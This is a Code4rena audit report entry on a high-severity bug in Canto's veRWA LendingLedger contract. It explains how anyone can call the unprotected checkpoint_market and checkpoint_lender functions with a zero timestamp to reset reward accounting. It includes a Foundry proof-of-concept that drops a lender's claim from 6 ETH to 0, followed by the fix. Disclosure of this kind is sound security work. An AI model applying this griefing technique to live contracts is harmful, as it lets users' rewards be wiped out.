---
tags:
  - lang/solidity
  - sector/lending
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - vuln/dos/griefing
  - fix/add-access-control
  - novelty/variant
protocol: "[[Canto]]"
auditors:
  - "[[ladboy233]]"
report: "https://code4rena.com/reports/2023-08-verwa"
genome:
  - "[[griefing]]"
  - "[[add-access-control]]"
  - "[[variant]]"
  - "[[reward-theft]]"
  - "[[access-roles]]"
  - "[[dos-resistance]]"
  - "[[reward-accounting]]"
  - "[[timestamp-dependence]]"
---
# [H-07] lack of access control in `LendingLedger.sol#checkpoint_lender` and function `checkpoint_market`

- id: 26975
- impact: HIGH
- protocol: [[Canto]]
- reporter: ladboy233 (Code4rena)
- source: https://code4rena.com/reports/2023-08-verwa

## Summary



This bug report relates to two functions, `checkpoint_market` and `checkpoint_lender`, which lack access control, meaning anyone can call them. The market is not checked to see if it is whitelisted, and the timestamp is not validated. A malicious actor could call the functions with a `_forwardTimestampLimit` set to 0, meaning the `_checkpoint_market` and `_checkpoint_lender` functions would never run inside `sync_ledger` and the user's reward could be griefed to 0.

A proof of concept is provided which demonstrates that when the malicious actor calls the functions with a `_forwardTimestampLimit` set to 0, the user's reward is 0, whereas when the malicious actor does not call the functions, the user's reward is 6 ETH.

The recommended mitigation step is to add access control to `checkpoint_market` and `checkpoint_lender`. OpenCoreCH (veRWA) confirmed and commented, suggesting a change to the code to ensure `lendingMarketBalancesEpoch` or `lendingMarketTotalBalanceEpoch` can never be decreased.

## Details


_Note: This audit was preceded by a [Code4rena Test Coverage competition](https://code4rena.com/test-coverage). While auditing was not the purpose of the testing phase, relevant and valuable findings reported during that phase were eligible to be judged. This finding [H-07] was discovered during that period and is being included here for completeness._

User's claim and `sync_lender` will be griefed at low cost.

### Proof of Concept

<details>

```solidity
   /// @notice Trigger a checkpoint explicitly.
    ///     Never needs to be called explicitly, but could be used to ensure the checkpoints within the other functions consume less gas (because they need to forward less epochs)
    /// @param _market Address of the market
    /// @param _forwardTimestampLimit Until which epoch (provided as timestamp) should the update be applied. If it is higher than the current epoch timestamp, this will be used.
    function checkpoint_market(
        address _market,
        uint256 _forwardTimestampLimit
    ) external is_valid_epoch(_forwardTimestampLimit) {
        require(
            lendingMarketTotalBalanceEpoch[_market] > 0,
            "No deposits for this market"
        );
        _checkpoint_market(_market, _forwardTimestampLimit);
    }

    /// @param _market Address of the market
    /// @param _lender Address of the lender
    /// @param _forwardTimestampLimit Until which epoch (provided as timestamp) should the update be applied. If it is higher than the current epoch timestamp, this will be used.
    function checkpoint_lender(
        address _market,
        address _lender,
        uint256 _forwardTimestampLimit
    ) external is_valid_epoch(_forwardTimestampLimit) {
        require(
            lendingMarketBalancesEpoch[_market][_lender] > 0,
            "No deposits for this lender in this market"
        );
        _checkpoint_lender(_market, _lender, _forwardTimestampLimit);
    }
```

</details><br>

These two functions lack access control, the caller is never validated, meaning anyone can call this function.

The market is not validated to see if the market is whitelisted or not.

The timestamp is never validated, the is\_valid\_epoch(\_forwardTimestampLimit) is insufficient.

```solidity
  /// @notice Check that a provided timestamp is a valid epoch (divisible by WEEK) or infinity
    /// @param _timestamp Timestamp to check
    modifier is_valid_epoch(uint256 _timestamp) {
        require(
            _timestamp % WEEK == 0 || _timestamp == type(uint256).max,
            "Invalid timestamp"
        );
        _;
    }
```

The user can just pick a past timestamp as the \_forwardTimestampLimit.

For example, if we set \_forwardTimestampLimit to 0.

Then for example in \_checkpoint_market

```solidity
   function _checkpoint_market(
        address _market,
        uint256 _forwardTimestampLimit
    ) private {
        uint256 currEpoch = (block.timestamp / WEEK) * WEEK;
        uint256 lastMarketUpdateEpoch = lendingMarketTotalBalanceEpoch[_market];
        uint256 updateUntilEpoch = Math.min(currEpoch, _forwardTimestampLimit);
        if (lastMarketUpdateEpoch > 0 && lastMarketUpdateEpoch < currEpoch) {
            // Fill in potential gaps in the market total balances history
            uint256 lastMarketBalance = lendingMarketTotalBalance[_market][
                lastMarketUpdateEpoch
            ];
            for (
                uint256 i = lastMarketUpdateEpoch;
                i <= updateUntilEpoch;
                i += WEEK
            ) {
                lendingMarketTotalBalance[_market][i] = lastMarketBalance;
            }
        }
        lendingMarketTotalBalanceEpoch[_market] = updateUntilEpoch;
    }
```

We set the lendingMarketTotalBalanceEpoch\[\_market] to 0.

Then if the next call of the \_checkpoint_market, the for loop would never run because the lastMarketUpdateEpoch is 0.

Over time, even when the for loop inside \_checkpoint_market does run, the caller are forced to pay very high gas fee.

Same issue applies to \_checkpoint_lender as well.

User can decrease lendingMarketBalancesEpoch, even to 0.

Basically, if a malicious actor call these two function with forwardTimestampLimit 0.

Then the \_checkpoint\_lender and \_checkpoint_market would never run inside sync\_ledger and claim reward.

Because user's reward can be griefed to 0 and stated are failed to updated properly.

**POC 1:**

<details>

```solidity
  function testLackOfAccessControlSyncMarket_POC_1() public {
        payable(ledger).transfer(1000 ether);
        uint248 amountPerEpoch = 1 ether;

        uint256 fromEpoch = WEEK * 5;
        uint256 toEpoch = WEEK * 10;

        address lendingMarket = vm.addr(5201314);

        vm.prank(goverance);
        ledger.setRewards(fromEpoch, toEpoch, amountPerEpoch);
      
        vm.warp(block.timestamp + WEEK);

        vm.prank(goverance);
        ledger.whiteListLendingMarket(lendingMarket, true);
        address lender = users[1];
        vm.startPrank(lendingMarket);

        int256 deltaStart = 1 ether;
        uint256 epochStart = (block.timestamp / WEEK) * WEEK;
        ledger.sync_ledger(lender, deltaStart);

        // gaps of 3 week
        uint256 newTime = block.timestamp + 3 * WEEK;
        vm.warp(newTime);
        int256 deltaEnd = 1 ether;
        uint256 epochEnd = (newTime / WEEK) * WEEK;
        ledger.sync_ledger(lender, deltaEnd);

        newTime = block.timestamp + 20 * WEEK;
        vm.warp(newTime);

        console.log("---sync ledger after set the update epoch to 0 --");

        // ledger.checkpoint_market(lendingMarket, 0);
        // ledger.checkpoint_lender(lendingMarket, lender, 0);
        ledger.sync_ledger(lender, deltaEnd);

        vm.stopPrank();
        vm.prank(lender);

        uint256 balanceBefore = address(lender).balance;
        ledger.claim(lendingMarket, fromEpoch, toEpoch);
        uint256 balanceAfter = address(lender).balance;
        console.log(balanceAfter - balanceBefore);

        vm.expectRevert("No deposits for this user");
        ledger.claim(lendingMarket, fromEpoch, toEpoch);
    }
```

</details><br>

If we run the POC, we get the normal result, user can claim and get 6 ETH as reward.

```solidity
 ---sync ledger after set the update epoch to 0 --
 6000000000000000000
```

If we uncomment:

```solidity
  // ledger.checkpoint_market(lendingMarket, 0);
  // ledger.checkpoint_lender(lendingMarket, lender, 0);
```

The claimed reward goes to 0.

### Recommended Mitigation Steps

Add access control to checkpoint\_market and checkpoint\_lender.

**[OpenCoreCH (veRWA) confirmed and commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/142#issuecomment-1680549736):**
 > This was a valid issue before the auditing contest (uncovered during the testing contest and fixed before the auditing contest), pasting my comment from there for reference:
> 
> Good point. It is generally intended that everyone can call these functions (should not be necessary in practice, but may be in some edge cases where a market was inactive for years) and I do not think that this is problematic per se. However, the problem here is that users can decrease `lendingMarketBalancesEpoch` or `lendingMarketTotalBalanceEpoch`, which should never happen. So I will probably change the code like this (and the same for lenders) such that this can never happen:
> ```solidity
>         if (lastMarketUpdateEpoch > 0 && lastMarketUpdateEpoch < currEpoch) {
>             // Fill in potential gaps in the market total balances history
>             uint256 lastMarketBalance = lendingMarketTotalBalance[_market][lastMarketUpdateEpoch];
>             for (uint256 i = lastMarketUpdateEpoch; i <= updateUntilEpoch; i += WEEK) {
>                 lendingMarketTotalBalance[_market][i] = lastMarketBalance;
>             }
>             if (updateUntilEpoch > lastMarketUpdateEpoch) {
>                 lendingMarketTotalBalanceEpoch[_market] = updateUntilEpoch;
>             }
>         }
> ```

***
